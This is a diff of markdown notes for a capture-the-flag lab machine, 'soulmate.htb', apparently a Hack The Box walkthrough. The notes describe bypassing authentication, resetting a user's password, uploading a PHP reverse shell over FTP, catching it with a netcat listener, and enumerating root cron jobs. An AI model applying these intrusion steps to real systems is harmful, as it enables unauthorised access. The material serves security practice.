@@ -47,7 +47,7 @@ It has a vunl to bypass auth method, and add new user.
 we can change passwd for all users.
 User management , reset passwd of ben, since ben have a folder named webprod, the files under this dir are similar as the index page of port 80 page.
 
-http://ftp.soulmate.htb/#%2FwebProd%2F, upload a php revershell. trigger it by accessing 'http://soulmate.htb//php-reverse-shell.php'
+http://ftp.soulmate.htb/#%2FwebProd%2F, upload a php revershell. trigger it by accessing http://soulmate.htb//php-reverse-shell.php
 
 `└─$ nc -nvlp 8821 `           
 ```
@@ -66,13 +66,14 @@ root:x:0:0:root:/root:/bin/bash
 ben:x:1000:1000:,,,:/home/ben:/bin/bash
 ```
 run linpeas, found some interesting things, root user is running a clean script to clean added files on web server dir, remember to backup the revershell uploaded.
+```
 root        1150  0.0  0.0   7140   220 ?        S    02:26   0:00 /usr/bin/epmd -daemon -address 127.0.0.1
 root        1156  0.0  0.0   6896  2796 ?        Ss   02:26   0:00 /usr/sbin/cron -f -P
 root        1158  0.0  0.1  10344  4056 ?        S    02:26   0:00  _ /usr/sbin/CRON -f -P
 root        1180  0.0  0.0   2892  1008 ?        Ss   02:26   0:00      _ /bin/sh -c /root/scripts/clean-web.sh
 root        1181  0.0  0.0   7372  3596 ?        S    02:26   0:00          _ /bin/bash /root/scripts/clean-web.sh
 root        1182  0.0  0.0   3104  1860 ?        S    02:26   0:00              _ inotifywait -m -r -e create --format %w%f /var/www/soulmate.htb/public
-
+```
 #### lateral move
 a script ran by root, www-data user has read privi
 ```
